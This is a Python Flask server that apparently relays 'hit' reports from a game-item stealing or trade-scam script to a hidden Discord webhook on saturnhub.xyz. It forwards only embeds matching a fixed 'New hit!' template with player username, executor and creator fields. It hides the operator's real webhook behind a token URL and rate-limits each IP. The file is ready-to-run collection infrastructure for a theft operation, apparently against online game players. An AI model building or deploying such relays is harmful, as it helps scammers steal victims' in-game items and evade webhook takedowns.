from flask import Flask, request, jsonify
from flask_cors import CORS
import requests, time, string, random, os

app = Flask(__name__)
CORS(app)

webhook_map = {}
ip_registry = {}
LIMIT_SECONDS = 3600

def generate_token(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

@app.route("/")
def home():
    return """
    <h1>✅ Webhook Proxy is Running on <code>saturnhub.xyz</code></h1>
    <p>Your proxy URL is ready. Just send requests to:</p>
    <code>https://saturnhub.xyz/webhook/&lt;token&gt;</code>
    """

@app.route("/webhook/<token>", methods=["POST"])
def handle_webhook(token):
    if token not in webhook_map:
        return jsonify({"error": "Invalid token"}), 404

    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    key = f"{token}:{client_ip}"

    if key in ip_registry and time.time() - ip_registry[key] < LIMIT_SECONDS:
        return jsonify({
            "error": "Rate limited",
            "time_remaining": int(LIMIT_SECONDS - (time.time() - ip_registry[key]))
        }), 429

    data = request.json
    if not data or "embeds" not in data:
        return jsonify({"error": "Missing or invalid 'embeds'"}), 400

    allowed = False
    for embed in data["embeds"]:
        if embed.get("title", "").strip() == "New hit!\nWhen ingame say anything in the chat to recive the stuff":
            for field in embed.get("fields", []):
                if field.get("name") == "Player Info":
                    value = field.get("value", "")
                    if all(x in value for x in ["Username:", "Executor:", "Creator:"]):
                        allowed = True
                        break

    if not allowed:
        return jsonify({"error": "Embed content not allowed"}), 400

    ip_registry[key] = time.time()
    real_webhook = webhook_map[token]
    response = requests.post(real_webhook, json=data)

    return jsonify({
        "status": "sent",
        "discord_status": response.status_code
    })

if __name__ == "__main__":
    # 🔐 Ask for the webhook before starting the server
    real_webhook = input("🔗 Enter your Discord webhook: ").strip()

    while not real_webhook.startswith("https://discord.com/api/webhooks/"):
        real_webhook = input("❌ Invalid webhook. Try again: ").strip()

    token = generate_token()
    webhook_map[token] = real_webhook

    proxy_url = f"https://saturnhub.xyz/webhook/{token}"
    print(f"\n✅ Your proxy is ready:")
    print(f"   {proxy_url}\n")

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
